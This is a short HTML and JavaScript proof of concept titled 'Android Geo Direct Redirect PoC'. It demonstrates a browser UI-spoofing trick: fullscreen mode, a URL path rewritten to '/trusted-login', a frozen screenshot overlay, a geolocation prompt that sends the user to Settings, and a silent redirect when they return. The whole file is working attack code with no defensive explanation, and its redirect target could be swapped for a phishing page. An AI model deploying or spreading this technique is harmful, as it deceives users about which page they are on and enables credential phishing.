<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Geo Direct Redirect PoC</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>
body {
  margin:0;
  font-family:system-ui;
  background:#f5f5f7;
  text-align:center;
}
button {
  margin-top:100px;
  font-size:16px;
  padding:14px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>
<body>

<button id="start">Start Demo</button>

<script>
const TARGET = "https://google.com";
let triggered = false;

// Freeze UI overlay
function freezeUI() {
  return html2canvas(document.body, {scale:2, useCORS:true}).then(canvas=>{
    const img = document.createElement("img");
    img.src = canvas.toDataURL();
    Object.assign(img.style, {
      position:"fixed",
      top:"0",
      left:"0",
      width:"100vw",
      height:"100vh",
      zIndex:"999999"
    });
    document.body.innerHTML="";
    document.body.appendChild(img);
  });
}

// Request geolocation just to trigger settings
function requestGeo() {
  navigator.geolocation.getCurrentPosition(()=>{},()=>{});
}

// Direct redirect
function redirectNow() {
  if(!triggered){
    triggered = true;
    location.replace(TARGET);
  }
}

// Detect user returning from Settings
document.addEventListener("visibilitychange", ()=>{ if(document.visibilityState==="visible") redirectNow(); });
window.addEventListener("focus", redirectNow);
window.addEventListener("pageshow", redirectNow);

// Start PoC
document.getElementById("start").onclick = ()=>{
  if(document.documentElement.requestFullscreen){
    document.documentElement.requestFullscreen();
  }

  history.replaceState({}, '', '/trusted-login');

  freezeUI().then(()=>{ setTimeout(requestGeo, 100); });
};
</script>

</body>
</html>
